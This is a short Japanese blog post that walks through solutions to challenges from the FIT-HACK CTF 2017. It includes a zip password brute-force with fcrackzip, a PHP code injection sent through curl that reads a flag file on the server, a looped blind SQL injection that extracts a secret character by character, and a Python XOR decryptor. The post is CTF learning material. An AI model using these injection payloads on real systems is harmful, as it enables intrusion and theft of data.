---
layout: post
redirect_from:
  - /writeup/ctf/2017/fit-hack-ctf-2017/
  - /blog/2017/04/22/fit-hack-ctf-2017/
date: "2017-04-22T01:04:40+09:00"
tags: [ "ctf", "writeup", "fit-hack-ctf", "guessing" ]
"target_url": [ "https://ctftime.org/event/451" ]
---

# FIT-HACK CTF 2017

cryptoはかなりのguessing CTFだった。

-   前処理: <https://twitter.com/elliptic_shiho/status/852779435983986691>
-   it's\_solvable: <https://rawsec.ml/en/FIT-HACK-2017-write-ups/#100-it-s-solvable-crypto>
-   bignumber: <https://twitter.com/_n_ari/status/852777396302299136>

## flag

```
$ fcrackzip -u -l 0-4 flag.zip


PASSWORD FOUND!!!!: pw == 1864
fcrackzip -u -l 0-4 flag.zip  5.96s user 5.98s system 6% cpu 3:14.71 total
```

## Sorry

HTMLとしてinjectionできるなあと思っていたらphpとしてinjectionできていた。

``` sh
$ curl https://sorry.problem.ctf.nw.fit.ac.jp/in.php -F etc=$' <?php\necho `cat /var/tmp/flag`;\n?>'
FIT{fdsa__dasdas_32fa}
FIT{fdsa__dasdas_32fa} <?php
echo `cat /var/tmp/flag`;
?>:mail@example.com <br>Saved it thank you!!



```

## Let's login

SQLi

```
$ s=9n89_ ; while true ; do for c in `seq 0 9` `alpha` _ ; do echo $s$c ; if curl -s https://login.problem.ctf.nw.fit.ac.jp/login.php -F name=name -F pass="' union select name, pass from user where pass like 'FIT{$s$c%' -- " | grep mes1 ; then s=$s$c ; break ; fi ; done ; done
```

`FIT{9n89_y0u3u_9a811}`

## simple cipher

普通に逆関数を書くだけ

``` python
#!/usr/bin/env python3
import binascii
enc_mes = '0c157e2b7f7b515e075b391f143200080a00050316322b272e0d525017562e73183e3a0d564f6718'
key = 'J2msBeG8'

m = list(binascii.unhexlify(enc_mes))

mes = [ None ] * len(m)
j = 0
for a in range(len(key)):
    i = a
    for b in range(len(m) // len(key)):
        mes[i] = chr(m[j] ^ ord(key[a]))
        j += 1
        i += len(key)
mes = ''.join(mes).rstrip()

print(mes)
```
